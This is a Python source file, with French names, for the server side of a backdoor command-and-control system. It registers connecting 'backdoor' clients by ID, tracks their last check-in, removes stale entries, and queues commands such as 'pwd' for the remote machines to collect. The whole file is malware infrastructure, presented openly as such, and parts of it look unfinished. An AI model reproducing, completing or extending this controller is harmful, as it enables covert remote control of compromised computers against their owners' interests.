from calendar import c
import socket
import random
from function import *

print("--------------------------------------")
print("                 SERVEUR              ")
print("--------------------------------------")

ipServeur = 'localhost'
portServeur = 45
#ipServeur = '192.168.1.27'
#portServeur = 500

socket_ecoute = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_ecoute.bind((ipServeur, portServeur))

def main(socket_ecoute):
    socket_ecoute.listen(5)
    connexion_client, adresse_client = socket_ecoute.accept()
    verifListeBackdoor()
    try:
        commande = msgRecv(connexion_client)
        if commande in listeCommande:
            executeCommande(commande,adresse_client,connexion_client)
        else:
            print("Reception commande non valide : "+str(commande))
    except:
        print("Erreur reception commande")
    
    connexion_client.close()


listeCommande = ['startBackdoor','updateBackdoor','listeBackdoor', 'updateListeBackdoor', 'pwd']
listeBackdoor = {}

def executeCommande(commande, adresse, connexion):

    if commande == 'startBackdoor':
        try:
            idOk = False
            id = 1
            while idOk != True:
                if id in listeBackdoor:
                    id += 1
                else:
                    idOk = True
            print("id choisi : "+str(id))
            msgSend(str(id),connexion)
            connexion.close()
            listeBackdoor[id] = [adresse[0],' ',' ',str(time.time())]
            print("listeBackdoor Serveur : "+str(listeBackdoor))
        except:
            print("Erreur startBackdoor")

    if commande == 'updateBackdoor':
        try:
            msgSend('a',connexion)
            id = int(msgRecv(connexion))
            listeBackdoor[id][-1] = time.time()

            if listeBackdoor[id][1] != ' ':
                print(listeBackdoor)
                msgSend(str(listeBackdoor[id][1]), connexion)
                listeBackdoor[id][1] = ' '
                print(listeBackdoor)
            else:
                msgSend('none',connexion) #a changer

        except:
            print("Erreur updateBackdoor")

    if commande == 'listeBackdoor':
        try:
            msgSend(str(len(listeBackdoor)),connexion)
            if len(listeBackdoor) > 0:
                for k,v in listeBackdoor.items():
                    msgSend(str(k),connexion)
                    msgRecv(connexion)
                    msgSend(str(len(v)),connexion)
                    msgRecv(connexion)
                    for e in v:
                        msgSend(str(e),connexion)   
        except:
            print("Erreur liste backdoor")
    
    if commande == 'pwd':
        msgSend('non',connexion)
        idMachine =  int(msgRecv(connexion))
        print(idMachine)
        liste = listeBackdoor[idMachine]
        liste[1] = 'pwd'
        listeBackdoor[idMachine] = liste
    
def verifListeBackdoor():
    idSup = []
    for k,v in listeBackdoor.items():
        date = float(listeBackdoor[k][-1])
        if date+3 < time.time():
            idSup.append(k)
    for i in idSup:
        del listeBackdoor[i]
        print("Sup id : "+str(i))


while True:
    main(socket_ecoute)
    
